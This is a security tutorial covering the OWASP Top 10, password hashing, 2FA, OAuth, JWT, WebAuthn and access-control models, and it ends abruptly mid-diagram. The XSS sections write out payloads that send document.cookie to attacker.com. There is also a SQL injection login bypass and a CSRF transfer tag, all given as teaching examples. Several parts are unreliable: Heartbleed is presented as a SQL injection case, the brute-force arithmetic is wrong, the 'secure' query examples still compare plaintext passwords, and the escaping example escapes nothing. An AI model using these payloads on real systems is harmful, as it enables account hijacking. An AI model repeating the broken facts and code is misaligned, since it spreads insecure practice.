# OWASP Top 10, Authentication & Authorization: Deep Dive


> **Run the live simulator**: [jwt-debugger.html](/13-security/jwt-debugger.html) — inspect, decode, tamper, and verify JSON Web Tokens with real HMAC-SHA256 signing.

```mermaid
graph LR
    WEB_APP["Web Application"] --> THREATS["Threat Surface"]
    THREATS --> SQLI["SQL Injection<br/>(input sanitization)"]
    THREATS --> XSS["XSS<br/>(sanitize output)"]
    THREATS --> CSRF["CSRF<br/>(anti-forgery token)"]
    THREATS --> IDOR["IDOR<br/>(access control)"]
    THREATS --> SSRF["SSRF<br/>(allowlist URLs)"]
    AUTHENT["Authentication"] --> PWD["Password<br/>(bcrypt/Argon2)"]
    AUTHENT --> MFA["MFA / 2FA<br/>(TOTP/WebAuthn)"]
    AUTHENT --> OAUTH["OAuth 2.0 / OIDC<br/>(delegated auth)"]
    AUTHENT --> SESSION["Session Mgmt<br/>(HTTP-only cookie)"]
    AUTHENT --> JWT["JWT<br/>(signed tokens)"]
    AUTHOR["Authorization"] --> RBAC["RBAC<br/>(role-based)"]
    AUTHOR --> ABAC["ABAC<br/>(attribute-based)"]
    AUTHOR --> CBAC["CBAC<br/>(claim-based)"]
    style WEB_APP fill:#4a8bc2
    style THREATS fill:#c73e1d
    style SQLI fill:#e8912e
    style XSS fill:#e8912e
    style CSRF fill:#e8912e
    style IDOR fill:#e8912e
    style SSRF fill:#e8912e
    style AUTHENT fill:#2d5a7b
    style PWD fill:#3a7ca5
    style MFA fill:#3fb950
    style OAUTH fill:#6f42c1
    style SESSION fill:#3a7ca5
    style JWT fill:#e8912e
    style AUTHOR fill:#3fb950
    style RBAC fill:#e8912e
    style ABAC fill:#6f42c1
    style CBAC fill:#3a7ca5
```

## Table of Contents
1. [Introduction](#introduction)
2. [Noob Explanation: Building Intuition](#noob-explanation)
3. [OWASP Top 10 Detailed](#owasp-top-10-detailed)
4. [Authentication Mechanisms](#authentication-mechanisms)
5. [Authorization Models](#authorization-models)
6. [End-to-End Flows](#end-to-end-flows)
7. [Large-Scale Systems](#large-scale-systems)
8. [Failure Analysis](#failure-analysis)
9. [Edge Cases](#edge-cases)
10. [Interview Questions](#interview-questions)
11. [Production Code Examples](#production-code-examples)
12. [Incident Stories](#incident-stories)
13. [Comparison Tables](#comparison-tables)

---

## Introduction

Application security is not about memorizing rules—it's about understanding *threat models* and designing systems that fail safely. The OWASP Top 10 represents the most critical security risks that plague web applications in production. Authentication and authorization are the gatekeepers: if they fail, everything else falls.

This guide assumes you understand networking (TCP/IP, HTTP, DNS) but not necessarily security. We'll build up from first principles to production-grade systems handling billions of users.

### Step-by-Step

1. **Identify the threat surface** — What data does your app handle, who wants it, and how can they attack?
2. **Design threat models** — For each critical asset, assume attackers will try to compromise it
3. **Implement defense layers** — Never rely on single defense; use multiple barriers (defense-in-depth)
4. **Validate security controls** — Code review, penetration testing, security audits
5. **Monitor and respond** — Log suspicious activity, detect breaches, respond to incidents

### Code Example

```python
# Security threat model checklist
threats = {
    'credentials': ['phishing', 'brute_force', 'replay'],
    'sessions': ['hijacking', 'fixation', 'timeout_bypass'],
    'data_transit': ['MITM', 'packet_sniffing'],
    'data_rest': ['database_breach', 'unauthorized_access']
}

# Defense layers for login
security_checks = [
    ('rate_limit', 'max 5 attempts per minute per IP'),
    ('password_hash', 'use bcrypt with cost 12'),
    ('https_only', 'encrypt credentials in transit'),
    ('2fa', 'require TOTP after password'),
    ('session_validation', 'verify session IP and user agent'),
    ('audit_log', 'log all auth attempts')
]

for threat, defenses in threats.items():
    for defense in defenses:
        if defense not in [x[0] for x in security_checks]:
            print(f"WARNING: {threat} has no defense for {defense}")
```

### Real-World Scenario

Yahoo's 2014 breach compromised 3 billion accounts. Root cause: They stored passwords using unsecured hashing, had minimal rate-limiting, and took months to discover the breach. They lost $350M in acquisition value. With proper security layers (bcrypt, rate-limiting, anomaly detection), this would have been impossible.

---

## Noob Explanation: Building Intuition

### Authentication vs Authorization

Think of a bank:
- **Authentication** = proving you are who you claim (showing your ID at the teller)
- **Authorization** = determining what you're allowed to do (the teller sees you're a customer, allows you to withdraw)

Real examples:
- You log in with a username/password → **authentication**
- You try to delete a file but don't have permission → **authorization fails**
- You show your passport at airport security → **authentication**
- You can only access business class lounge, not first class → **authorization**

### Passwords: The Weakest Link

A password like `MyP@ssw0rd123` seems strong (uppercase, lowercase, number, special char). But:

```
User enters: MyP@ssw0rd123
System sends to server: MyP@ssw0rd123 (WRONG - over HTTP!)
Attacker reads password from network
```

**Never do this.** Always use HTTPS. Even then:

```
Server stores: MyP@ssw0rd123 (WRONG - plaintext!)
Attacker breaks in, gets password file
Attacker sells 100M passwords to other hackers
All those users are now compromised on other sites (password reuse)
```

**What to do:**
```
User enters: MyP@ssw0rd123
Server computes: bcrypt(MyP@ssw0rd123 + random_salt) = $2b$12$abcd...xyz
Server stores: $2b$12$abcd...xyz (only hash, never plaintext)
Attacker breaks in, gets hash file
Attacker cannot reverse bcrypt (computational cost: billions of attempts)
```

#### Step-by-Step: Secure Password Handling

1. **Enforce policy** — Minimum 12 chars, entropy check (use zxcvbn library)
2. **Transmit over HTTPS** — Certificate pinning for mobile apps to prevent MITM
3. **Hash with bcrypt** — Cost factor 12, unique random salt per password
4. **Store hash only** — Never store plaintext, even encrypted
5. **Compare safely** — Use constant-time comparison (hmac.compare_digest) to prevent timing attacks

#### Code Example: Password Hashing

```python
import bcrypt
import hmac

def register_user(username, password):
    # Enforce minimum length and complexity
    if len(password) < 12:
        raise ValueError("Password must be 12+ characters")
    
    # Hash password (bcrypt includes salt generation)
    password_hash = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt(rounds=12))
    
    # Store hash in database (never the plaintext password)
    db.create_user(username, password_hash.decode('utf-8'))
    return True

def login_user(username, password_input):
    user = db.get_user(username)
    if not user:
        # Timing attack prevention: still hash to maintain consistent time
        bcrypt.hashpw(password_input.encode('utf-8'), bcrypt.gensalt())
        return False
    
    # Verify password (bcrypt.checkpw is constant-time)
    if bcrypt.checkpw(password_input.encode('utf-8'), user.password_hash.encode('utf-8')):
        return True
    return False
```

#### Real-World Scenario: Ashley Madison Breach

Ashley Madison (2015): 37 million users exposed. Passwords were bcrypt-hashed, so attacker couldn't use rainbow tables. However, weak passwords still got cracked via brute force. Lesson: bcrypt buys time (cost factor) but doesn't eliminate weak password risk. Mandatory password policy would have saved millions in reputation damage.

### SQL Injection: Tricking the Database

Imagine a login form:

```python
# VULNERABLE CODE
username = request.form['username']
password = request.form['password']
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
# Execute query
```

Normal user enters: `alice` and `secret123`
```sql
SELECT * FROM users WHERE username = 'alice' AND password = 'secret123'
-- Finds alice, checks password, logs in
```

Attacker enters: `admin' --` as username and anything as password
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
-- The -- comments out the password check!
-- Attacker logs in as admin without password
```

**What to do:**
```python
# SECURE CODE - parameterized query
username = request.form['username']
password = request.form['password']
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))
-- Database driver handles escaping automatically
```

The database treats the parameters as *data*, not *code*. The attacker's input cannot change the query structure.

#### Step-by-Step: SQL Injection Prevention

1. **Never concatenate strings** — Don't use f-strings or string concatenation for SQL
2. **Use parameterized queries** — Every database driver supports prepared statements
3. **Validate on input** — Check type, length, format (defense-in-depth)
4. **Escape on output** — Some ORMs handle this automatically
5. **Test with fuzzing** — Use tools like SQLMap to verify parameterization

#### Code Example: SQL Injection Prevention

```python
# VULNERABLE - Never do this
username = request.form['username']
password = request.form['password']
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cursor.execute(query)

# SECURE - Always use parameters
query = "SELECT * FROM users WHERE username = ? AND password = ?"
cursor.execute(query, (username, password))

# SECURE - ORM (SQLAlchemy)
user = db.session.query(User).filter_by(username=username, password=password).first()
# ORM automatically handles parameterization
```

#### Real-World Scenario: Heartbleed via SQL Injection

In 2014, multiple sites suffered SQL injection → RCE chains. Attackers injected code to execute system commands (stacked queries), dumped entire databases with SELECT * INTO OUTFILE, read /etc/passwd. Parameterized queries would have prevented all of this.

---

### Cross-Site Scripting (XSS): Injecting Malicious Code

You're logged into Twitter. You click a link from a malicious site:
```html
<!-- Malicious site embeds: -->
<img src="x" onerror="
  fetch('https://attacker.com/steal?cookie=' + document.cookie)
">
```

When you view your Twitter feed, this runs in your browser:
1. The `<img>` tag loads in your Twitter session
2. The `onerror` handler executes JavaScript in your browser
3. Your session cookie (which authenticates you to Twitter) gets sent to the attacker
4. Attacker uses your session cookie to impersonate you, post tweets, read DMs, etc.

**What to do:**
```html
<!-- Escape user input before rendering -->
username = "alert('xss')" <!-- malicious input -->
escaped = htmlescape(username) = "alert('xss')" <!-- rendered as text, not code -->

<!-- Use Content Security Policy (CSP) header -->
Content-Security-Policy: script-src 'self' https://trusted-cdn.com
<!-- Only scripts from this origin or trusted-cdn.com can run -->
<!-- The attacker's inline script cannot run, attack prevented -->
```

### CSRF: Impersonating the User's Browser

You're logged into your bank. You visit a malicious site (thinking it's a friend's blog):

```html
<!-- Malicious site contains: -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000">
```

What happens:
1. You visit the malicious site
2. Your browser sees the `<img>` tag
3. Your browser tries to load that image *using your bank session cookie*
4. Your bank sees a request from you to transfer $1000
5. Since you're logged in, the bank processes it
6. Your money is transferred, you had no idea

This is **Cross-Site Request Forgery (CSRF)**: the attacker tricks your browser into making a request to a trusted site.

**What to do:**
```python
# Generate a CSRF token when showing the form
token = generate_random_token()
session['csrf_token'] = token
# Render form with token
<input type="hidden" name="csrf_token" value="{{ token }}">

# When form is submitted, verify token
posted_token = request.form['csrf_token']
session_token = session['csrf_token']
if posted_token != session_token:
    reject_request()  # CSRF attack prevented
```

The malicious site doesn't know the token, so it can't forge a request.

### OAuth: Delegating Authentication

You want to log into Spotify using your Google account instead of creating a new password:

```
1. You click "Login with Google" on Spotify
2. Spotify redirects you to Google: https://accounts.google.com/oauth?client_id=spotify&redirect_uri=spotify.com/callback
3. You see Google's login page, enter your Google password
4. Google knows it's you, redirects you back: https://spotify.com/callback?code=authorization_code_123&state=xyz
5. Spotify's backend exchanges the code for a token (Google verifies Spotify's identity)
6. Spotify now has an access token that lets it read your Google email and profile
7. Spotify creates a session for you
```

Key insight: **you never gave Spotify your Google password**. Google verifies you once, gives Spotify limited access. If Spotify gets hacked, your Google password stays safe.

### 2FA: Adding a Second Barrier

Single factor (password) can be stolen. Two factors:

```
1. Attacker steals your password somehow
2. Attacker tries to log in
3. System asks for second factor (code from phone)
4. Attacker doesn't have your phone
5. Login fails, account protected
```

Types:
- **SMS**: System sends code to your phone (weakest, SMS can be intercepted)
- **App-based (TOTP)**: Google Authenticator generates codes (better, no network needed)
- **Hardware token**: Physical device with encrypted key (strongest, expensive)
- **Biometric**: Fingerprint, face (convenient, different threat model)

---

## OWASP Top 10 Detailed

### 1. Broken Authentication

**What it means:** Authentication system can be bypassed or credentials can be compromised.

**Real attack:**
```
Attacker obtains 100M passwords from a database breach
Attacker tries them against your login form, one by one
Your system has no rate limiting
Attacker gets in within hours
```

**Why it happens:**
- No rate limiting on login attempts
- Weak password policy (allows "password123")
- Session tokens not validated
- Passwords stored in plaintext or with weak hashing
- No account lockout after failed attempts
- "Remember me" tokens never expire
- Session cookies sent over HTTP

**Defense layers:**
```
Layer 1: Require strong passwords (min 12 chars, entropy check)
Layer 2: Rate limit login attempts (max 5/min per IP)
Layer 3: Implement account lockout (lock after 10 failed attempts)
Layer 4: Enforce HTTPS (encrypt password in transit)
Layer 5: Hash passwords with bcrypt/Argon2 (expensive to crack)
Layer 6: Implement 2FA (SMS, TOTP, WebAuthn)
Layer 7: Monitor for anomalies (login from new country, unusual time)
Layer 8: Force re-authentication for sensitive actions (change password, delete account)
```

**Production example:**
```python
import bcrypt
import time
from functools import wraps

# Rate limiting
LOGIN_ATTEMPTS = {}  # {ip_address: [(timestamp, success), ...]}
MAX_ATTEMPTS = 5
WINDOW = 300  # seconds

def check_rate_limit(ip):
    now = time.time()
    if ip not in LOGIN_ATTEMPTS:
        LOGIN_ATTEMPTS[ip] = []
    
    # Remove old attempts outside window
    LOGIN_ATTEMPTS[ip] = [(ts, ok) for ts, ok in LOGIN_ATTEMPTS[ip] 
                         if now - ts < WINDOW]
    
    # Check failed attempts in window
    failed = sum(1 for ts, ok in LOGIN_ATTEMPTS[ip] if not ok)
    if failed >= MAX_ATTEMPTS:
        raise RateLimitError(f"Too many failed attempts, retry in {WINDOW}s")

def login(username, password, ip_address):
    check_rate_limit(ip_address)
    
    # Get user from database
    user = db.get_user(username)
    if not user:
        # Timing attack prevention: hash anyway
        bcrypt.checkpw(password.encode(), 
                      bcrypt.hashpw(b"fake", bcrypt.gensalt()))
        LOGIN_ATTEMPTS[ip_address].append((time.time(), False))
        raise AuthError("Invalid username or password")
    
    # Verify password using bcrypt
    stored_hash = user['password_hash']
    if bcrypt.checkpw(password.encode(), stored_hash.encode()):
        # Clear rate limit on success
        LOGIN_ATTEMPTS[ip_address] = []
        
        # Create session with secure, random token
        session_token = secrets.token_urlsafe(32)
        db.store_session(user['id'], session_token, expires_in=3600)
        
        # Log successful login (audit trail)
        db.log_audit("LOGIN_SUCCESS", user['id'], ip_address)
        
        return {"session_token": session_token, "user": user}
    else:
        LOGIN_ATTEMPTS[ip_address].append((time.time(), False))
        raise AuthError("Invalid username or password")
```

### 2. Broken Access Control

**What it means:** Users can access resources they shouldn't (horizontal or vertical privilege escalation).

**Real attack:**
```
Alice is a regular user (user_id=123)
Bob is an admin (user_id=456)
Alice visits: https://app.com/users/456/profile
Application doesn't check if Alice can view Bob's profile
Alice sees Bob's private data (home address, phone, email)
```

**Why it happens:**
- No authorization check before showing resource
- Authorization checks on client-side only (easily bypassed)
- User-controlled IDs in URLs (IDOR: Insecure Direct Object Reference)
- No role-based access control
- Privilege escalation (user changes their role in HTTP request)

**Defense:**
```python
@app.route('/users/<user_id>/profile')
@require_login
def get_user_profile(user_id):
    current_user = get_authenticated_user()
    target_user = db.get_user(user_id)
    
    # Authorization check: can current_user view target_user?
    if not can_view_profile(current_user, target_user):
        return 403  # Forbidden
    
    return jsonify(target_user.profile)

def can_view_profile(viewer, target):
    # Users can only view their own profile or public profiles
    if viewer.id == target.id:
        return True
    if target.profile_is_public:
        return True
    # Check friendship
    if db.are_friends(viewer.id, target.id):
        return True
    return False
```

### 3. Injection (SQL, NoSQL, Command Injection)

Already covered in depth above. Core principle: **separate code from data**.

```python
# SQL Injection
query = f"SELECT * FROM users WHERE id = {user_id}"  # BAD
query = "SELECT * FROM users WHERE id = ?"  # GOOD
cursor.execute(query, (user_id,))

# NoSQL Injection
users = db.users.find({"email": user_input})  # BAD - user_input could be {"$ne": null}
users = db.users.find({"email": {"$eq": user_input}})  # GOOD
```

### 4. Insecure Deserialization

**What it means:** Deserializing untrusted data executes arbitrary code.

```python
# BAD: pickle can execute arbitrary code
data = request.get_data()
user = pickle.loads(data)  # If data is crafted, arbitrary code runs!

# GOOD: use JSON, validate structure
import json
data = json.loads(request.get_data())
user = User(**data)  # Only sets known fields
```

### 5. Broken Access Control (continued)

### 6. Security Misconfiguration

**What it means:** Default credentials, exposed config files, unnecessary services.

```
- Default admin password: admin/admin
- Config file in web root with database password
- Directory listing enabled (attacker sees all files)
- CORS wildcard: Access-Control-Allow-Origin: *
- Unnecessary HTTP methods enabled (PUT, DELETE on production)
- Old, vulnerable dependencies not updated
```

### 7. Cross-Site Scripting (XSS)

Covered above. Three types:

**Reflected XSS:**
```
User clicks link: https://app.com/search?q=<script>alert('xss')</script>
Server returns: You searched for <script>alert('xss')</script>
User's browser executes the script
```

**Stored XSS:**
```
Attacker posts comment: <script>fetch('https://attacker.com/steal?c='+document.cookie)</script>
Server stores in database
Every user viewing this comment has the script run in their browser
All session cookies stolen
```

**DOM-based XSS:**
```javascript
// Client-side code
var query = new URLSearchParams(window.location.search).get('q');
document.getElementById('results').innerHTML = 'You searched for: ' + query;
// If query = <img src=x onerror="...">
// XSS vulnerability!
```

**Prevention:**
```html
<!-- Content Security Policy -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' https://trusted-cdn.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' https:;
  font-src 'self';
">

<!-- Escape output -->
{{ user_input }}  <!-- Most templates do this by default -->

<!-- Use secure libraries -->
DOMPurify.sanitize(user_input)  // JavaScript
bleach.clean(user_input)  # Python
```

### 8. Using Components with Known Vulnerabilities

**What it means:** Dependencies (libraries, frameworks) have known security bugs.

```
Your app uses: lodash 4.17.15
Security advisory: CVE-2019-10744 - lodash has RCE vulnerability
You haven't updated in 2 years
Attacker exploits CVE, gains code execution
```

**Defense:**
```bash
# Check for vulnerable dependencies
npm audit
pip check  # Python
./gradlew dependencyCheckAnalyze  # Java

# Update regularly
npm update
npm audit fix

# Use dependency scanning in CI/CD
- Every PR checks for new vulnerabilities
- Fail build if critical vulnerability found
```

### 9. Insufficient Logging & Monitoring

**What it means:** Attacks happen but you don't notice for months.

```
June: Attacker gains initial access
July: Attacker moves laterally, escalates privileges
August: Attacker exfiltrates 50GB of customer data
December: You finally notice (from news article)
→ 6 months of undetected breach
```

**What to log:**
```
✓ Failed login attempts
✓ Successful logins (timestamp, IP, location, device)
✓ Password changes
✓ Permission changes (who changed what, when)
✓ API access (unusual endpoints, high volume)
✓ Data access (large exports, sensitive data reads)
✓ Administrative actions
✓ Configuration changes

✗ Passwords
✗ Credit card numbers
✗ PII in plaintext
```

**Real-time monitoring:**
```
- Alert if 10+ failed logins from same IP in 1 minute
- Alert if login from impossible geographic location (e.g., Brazil at 2pm, India at 2:15pm)
- Alert if user downloads 10GB of data suddenly
- Alert if admin makes changes outside business hours
- Alert if API token usage patterns change drastically
```

### 10. Using Insecure Transport

**What it means:** Data sent unencrypted over network.

```
Problem: HTTP instead of HTTPS
- Session cookies visible in transit
- Passwords visible in transit
- Attacker does MITM (man-in-the-middle)
- Attacker steals everything

Solution: HTTPS (TLS)
- Encrypts all data in transit
- Verifies server identity (certificate)
- Prevents MITM attacks
```

---

## Authentication Mechanisms

### Passwords

**How they work:**
```
User: "MyPassword123"
System: SHA256(MyPassword123) = abc123...
Database: stores abc123...

Later, user logs in:
User: "MyPassword123"
System: SHA256(MyPassword123) = abc123...
Compare: stored (abc123...) == computed (abc123...)
Result: Match → authenticate
```

**Problem: Too fast to brute force**
```
Attacker has SHA256 hash: abc123...
Attacker tries 1 billion passwords/second
SHA256 is fast (designed for speed)
Takes ~30 seconds to crack
```

**Solution: Use slow hash (bcrypt, scrypt, Argon2)**
```
bcrypt:
- Configurable work factor (cost)
- Higher cost = slower
- Can increase over time as hardware gets faster

user input: "MyPassword123"
bcrypt(MyPassword123, salt, cost=12) = $2b$12$abcdef...
Time to compute: ~250ms (slow by cryptographic standards!)

Attacker tries to brute force:
1 billion passwords/second ÷ 250ms per attempt = 4000 attempts/second
10 billion attempts to crack = 2.5 million seconds = 29 days
```

**bcrypt details:**
```
$2b$12$abcdefghijklmnopqrstuvwxyz.hash
 │  │  └─ cost (2^12 iterations)
 │  └──── version
 └─────── algorithm (bcrypt)
```

### Two-Factor Authentication (2FA)

**TOTP (Time-based One-Time Password):**
```
Setup:
1. System generates random secret: "JBSWY3DPEBLW64TMMQ======"
2. System shows QR code to user
3. User scans with Google Authenticator
4. App stores secret locally

Login:
1. User enters username/password
2. System asks for 6-digit code
3. User opens Google Authenticator
4. App computes: HMAC-SHA1(secret, current_timestamp // 30)
5. Shows: 123456
6. User enters 123456
7. Server computes same HMAC (same timestamp)
8. If match: authenticate
9. Code expires in 30 seconds
```

**Why it's secure:**
- Secret never transmitted over network
- Codes expire in 30 seconds
- Each code is different (based on time)
- Attacker can't predict next code

**Codes:**
```python
import hmac
import hashlib
import base64
import struct
import time

def get_totp_code(secret, timestamp=None):
    if timestamp is None:
        timestamp = int(time.time())
    
    # Convert timestamp to 30-second intervals
    counter = timestamp // 30
    
    # Convert counter to 8-byte big-endian
    message = struct.pack('>Q', counter)
    
    # Decode secret from base32
    secret_bytes = base64.b32decode(secret)
    
    # Compute HMAC-SHA1
    hmac_obj = hmac.new(secret_bytes, message, hashlib.sha1)
    digest = hmac_obj.digest()
    
    # Take last 4 bits as offset
    offset = digest[-1] & 0x0f
    
    # Extract 4 bytes starting at offset
    code = struct.unpack('>I', digest[offset:offset+4])[0]
    
    # Keep only last 6 digits
    code = code & 0x7fffffff
    return str(code % 1000000).zfill(6)
```

### OAuth 2.0

**Flow:**
```
User → (1) Click "Login with Google"
       ↓
  App → (2) Redirect to Google
       https://accounts.google.com/o/oauth2/v2/auth?
         client_id=YOUR_APP_ID&
         redirect_uri=https://yourapp.com/oauth/callback&
         scope=email%20profile&
         state=random_string_xyz
       ↓
Google ← (3) User logs in, sees permissions
       ↓
User → (4) Approves "Allow yourapp.com to access your email and profile"
       ↓
Google → (5) Redirect back to app with authorization code
       https://yourapp.com/oauth/callback?code=AUTH_CODE_123&state=xyz
       ↓
  App ← (6) Verify state parameter matches (prevent CSRF)
       ↓
  App → (7) Backend calls Google API (not visible to user)
       POST https://oauth2.googleapis.com/token
         grant_type=authorization_code&
         code=AUTH_CODE_123&
         client_id=YOUR_APP_ID&
         client_secret=YOUR_APP_SECRET&
         redirect_uri=https://yourapp.com/oauth/callback
       ↓
Google → (8) Validate client_secret, return access token
       {
         "access_token": "ya29.a0...",
         "refresh_token": "1//abc...",
         "expires_in": 3600,
         "token_type": "Bearer"
       }
       ↓
  App ← (9) Use access token to fetch user email/profile from Google API
       GET https://www.googleapis.com/oauth2/v2/userinfo
         Authorization: Bearer ya29.a0...
       ↓
Google → (10) Return user info
       {
         "id": "118123456789",
         "email": "user@gmail.com",
         "name": "John Doe",
         "picture": "..."
       }
       ↓
  App → (11) Create session for this user in your system
       Set-Cookie: session_id=xyz; HttpOnly; Secure; SameSite=Strict
       ↓
User ← (12) Redirect to home page, user is logged in
```

**Why it's secure:**
- User's Google password never shared with your app
- Access tokens are limited (can't change password, delete account)
- Client secret verified backend-to-backend (user can't intercept)
- Code only valid for 10 minutes
- State parameter prevents CSRF attacks

### JWT (JSON Web Tokens)

**Structure:**
```
header.payload.signature

header: {
  "alg": "HS256",
  "typ": "JWT"
}

payload: {
  "sub": "123456",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622  // Expires in 1 hour
}

signature: HMACSHA256(
  base64url(header) + "." + base64url(payload),
  secret
)

Full JWT:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Verification:**
```python
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

try:
    payload = jwt.decode(
        token,
        secret="your-secret-key",
        algorithms=["HS256"]
    )
    # payload: {"sub": "123456", "name": "John Doe", ...}
    # If signature is invalid, jwt.decode raises exception
    return payload
except jwt.ExpiredSignatureError:
    # Token expired
    return None
except jwt.InvalidSignatureError:
    # Signature doesn't match (token was tampered)
    return None
```

**Key insight:** Server doesn't need to store JWT in database. The token itself proves it's valid (signature is unforgeable without secret). But you can still revoke tokens by:
- Checking in blacklist database
- Short expiration + refresh token pattern
- Logout deletes refresh token

### WebAuthn (FIDO2)

**The future of password-free auth:**

```
Registration:
1. User visits app, clicks "Register with Biometric"
2. Browser prompts: "Touch your fingerprint sensor"
3. Device (laptop, phone) generates cryptographic keypair:
   - Public key: shared with server
   - Private key: stays on device, protected by biometric/PIN
4. User touches sensor, proves identity
5. Server stores public key, associates with user

Login:
1. User visits app, clicks "Login with Biometric"
2. Browser asks: "Which account? (list of public keys)"
3. User selects their account
4. Browser asks: "Touch your fingerprint sensor"
5. Device signs a challenge with private key (requires biometric/PIN)
6. Device sends signature to server
7. Server verifies signature using stored public key
8. If valid: user is authenticated
```

**Why it's better than passwords:**
- No password stored on server (nothing to leak)
- No password entered in browser (can't be keylogged, phished)
- Cryptographically secure (signature is unforgeable)
- Each device has unique keypair (device compromise doesn't affect others)

**Code:**
```javascript
// Registration
const credential = await navigator.credentials.create({
  publicKey: {
    challenge: new Uint8Array(32),  // Random challenge from server
    rp: {
      name: "My App",
      id: "myapp.com"
    },
    user: {
      id: new Uint8Array(16),
      name: "user@example.com",
      displayName: "John Doe"
    },
    pubKeyCredParams: [
      { alg: -7, type: "public-key" },  // ES256
      { alg: -257, type: "public-key" }  // RS256
    ],
    attestation: "direct",
    authenticatorSelection: {
      authenticatorAttachment: "platform",  // Built-in (biometric)
      userVerification: "preferred"
    }
  }
});

// credential contains public key, attestation, etc.
// Send to server, store in database

// Login
const assertion = await navigator.credentials.get({
  publicKey: {
    challenge: new Uint8Array(32),  // Different challenge from server
    rpId: "myapp.com"
  }
});

// assertion.signature proves device has private key
// Send to server, verify using stored public key
```

---

## Authorization Models

### Role-Based Access Control (RBAC)

**Concept:**
```
User → Role → Permissions

User "alice" has role "admin"
Role "admin" has permissions:
  - create_user
  - delete_user
  - modify_settings
  - view_logs

User "bob" has role "user"
Role "user" has permissions:
  - view_own_profile
  - edit_own_profile
```

**Implementation:**
```python
def can_delete_user(current_user, target_user_id):
    # Check if current_user has delete_user permission
    permissions = get_user_permissions(current_user.id)
    return "delete_user" in permissions

def get_user_permissions(user_id):
    user = db.get_user(user_id)
    roles = db.get_user_roles(user_id)
    permissions = set()
    for role in roles:
        role_perms = db.get_role_permissions(role.id)
        permissions.update(role_perms)
    return permissions

@app.route('/users/<user_id>', methods=['DELETE'])
def delete_user(user_id):
    current_user = get_authenticated_user()
    if not can_delete_user(current_user, user_id):
        return 403
    db.delete_user(user_id)
    return 204
```

**Issues:**
- Role explosion: 50 roles, hard to manage
- No dynamic attributes (can't express "user can only access their own data")
- No context awareness (time-based, location-based permissions)

### Attribute-Based Access Control (ABAC)

**Concept:**
```
Policy: "A user can view a document if:
  - User is the document owner AND
  - Document is not archived AND
  - User's security clearance >= document's classification"

Attributes:
- User: name, role, department, security_clearance, location
- Resource: owner, classification, archived, created_at
- Environment: time_of_day, ip_address, network_type
- Action: view, edit, delete, share
```

**Implementation:**
```python
def can_access(user, resource, action):
    """
    User can view resource if:
    1. User is owner, OR
    2. Resource is public and action is view, OR
    3. User has sufficient security clearance
    """
    
    # Check ownership
    if user.id == resource.owner_id:
        return True
    
    # Check public access
    if resource.is_public and action == "view":
        return True
    
    # Check clearance
    user_clearance = user.security_clearance
    resource_classification = resource.classification
    clearance_level = {"public": 0, "internal": 1, "confidential": 2, "secret": 3}
    
    if clearance_level[user_clearance] >= clearance_level[resource_classification]:
        return True
    
    return False
```

**Advantages:**
- Fine-grained control
- Handles complex policies
- Easier to scale than RBAC

### Context-Based Access Control (CBAC)

**Adding context:**
```
Policy: "User can transfer >$10,000 if:
  - It's business hours (9am-5pm ET), AND
  - User is at office location, AND
  - User's account is older than 30 days"
```

**Implementation:**
```python
def can_transfer(user, amount):
    now = datetime.now()
    is_business_hours = 9 <= now.hour < 17 and now.weekday() < 5
    
    user_location = get_user_location(user.id)  # From IP geolocation
    is_at_office = is_location_office(user_location)
    
    account_age = (now - user.created_at).days
    is_established = account_age >= 30
    
    if amount > 10000:
        return is_business_hours and is_at_office and is_established
    else:
        return True  # Small amounts, no restrictions
```

---

## End-to-End Flows

### Login Flow

```
┌─────────────────────────────────────────────────────────┐
│                   USER'S BROWSER                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  1. User enters: username="alice", password="secret"   │
│     [Encrypted by HTTPS]                               │
│                                                         │
└─────────────────────────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────┐
                    │        SERVER                │
                    ├────────────────────────────┤
                    │                            │
                    │ 2. Receive encrypted      │
                    │    credentials            │
                    │                            │
                    │ 3. Look up user "alice"   │
                    │    in database             │
                    │                            │
                    │ 4. Get stored hash:       │
                    │    $2b$12$abcdef...       │
                    │                            │
                    │ 5. Hash input:            │
                    │    bcrypt("secret",       │
                    │     stored_hash)          │
                    │                            │
                    │ 6. Compare hashes         │
                    │    Match? ✓                │
                    │                            │
                    │ 7. Check 2FA required?    │
                    │    Yes                     │
                    │                            │
                    │ 8. Generate temporary     │
                    │    token: temp_xyz        │
                    │    (expires in 10min)     │
                    │                            │
                    │ 9. Send: "2FA required,   │
                    │    enter code"            │
                    │                            │
                    └─────────────┬──────────────┘
                                  │
┌─────────────────────────────────▼───────────────────────┐
│                   USER'S BROWSER                        │
├─────────────────────────────────────────────────────────┤
│                                                         │
│  10. User opens Google Authenticator, sees: 123456    │
│      Enters 123456 + temp_token (temp_xyz)            │
│                                                         │
└─────────────────────────────────┬───────────────────────┘
                                  │
                    ┌─────────────▼───────────────┐
                    │        SERVER                │
                    ├────────────────────────────┤
                    │                            │
                    │ 11. Validate temp_token   │
                    │     Not expired? ✓         │
                    │                            │
                    │ 12. Get Alice's TOTP      │
                    │     secret from DB        │
                    │                            │
                    │ 13. Compute expected      │
                    │     code for now:         │
                    │     TOTP(secret) = 123456 │
                    │                            │
                    │ 14. Compare:              │
                    │     123456 == 123456 ✓    │
                    │                            │
                    │ 15. Generate session      │
                    │     token: sess_abc123... │
                    │     expires: 1 hour       │
                    │                            │
                    │ 16. Store in Redis:       │
                    │     sess_abc123 → {      │
                    │       user_id: 123,       │
                    │       ip: 192.168.1.1,    │
                    │       user_agent: "...",  │
                    │       created: now        │
                    │     }                      │
                    │                            │
                    │ 17. Send Set-Cookie:      │
                    │     session_id=sess_abc   │
                    │     HttpOnly              │
                    │     Secure                │
